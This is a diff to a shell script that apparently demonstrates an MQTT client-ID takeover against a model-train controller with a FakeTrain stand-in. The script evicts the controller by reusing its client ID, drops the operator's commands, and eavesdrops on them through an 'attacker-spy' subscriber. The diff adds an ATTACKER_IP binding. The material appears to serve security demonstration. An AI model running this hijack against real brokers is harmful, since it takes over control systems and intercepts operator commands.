@@ -9,6 +9,7 @@ set -euo pipefail
 BROKER="${BROKER:-mosquitto}"
 TRAIN="${TRAIN:-t1}"
 HOLD="${HOLD:-15}"  # seconds to hold the takeover
+ATTACKER_IP="${ATTACKER_IP:-192.168.100.53}"
 
 CLIENT_ID="choochoo-controller-${TRAIN}"
 
@@ -20,7 +21,7 @@ echo "The controller will immediately try to reconnect — we need to re-evict i
 echo ""
 
 echo "--- Subscribing to state so we can see the controller go offline ---"
-mosquitto_sub -h "$BROKER" -t "choochoo/train/${TRAIN}/discovery" -C 1 -v 2>/dev/null &
+mosquitto_sub -h "$BROKER" -A "$ATTACKER_IP" -t "choochoo/train/${TRAIN}/discovery" -C 1 -v 2>/dev/null &
 SUB_PID=$!
 sleep 1
 
@@ -33,7 +34,7 @@ echo "(The FakeTrain will coast at last power value — real train would too.)"
 echo ""
 
 # Connect with the controller's client ID; subscribe to cmd/+ but ignore it
-timeout "$HOLD" mosquitto_sub -h "$BROKER" \
+timeout "$HOLD" mosquitto_sub -h "$BROKER" -A "$ATTACKER_IP" \
   -i "$CLIENT_ID" \
   -t "choochoo/train/${TRAIN}/cmd/+" \
   -v 2>/dev/null &
@@ -42,8 +43,8 @@ TAKEOVER_PID=$!
 # Show any commands the operator tries to send during the takeover
 sleep 2
 echo "--- Operator commands arriving (being silently dropped) ---"
-timeout $(( HOLD - 3 )) mosquitto_sub -h "$BROKER" \
-  -i "attacker-spy" \
+timeout $(( HOLD - 3 )) mosquitto_sub -h "$BROKER" -A "$ATTACKER_IP" \
+  -i "attacker-spy-$$" \
   -t "choochoo/train/${TRAIN}/cmd/+" \
   -v 2>/dev/null || true
 
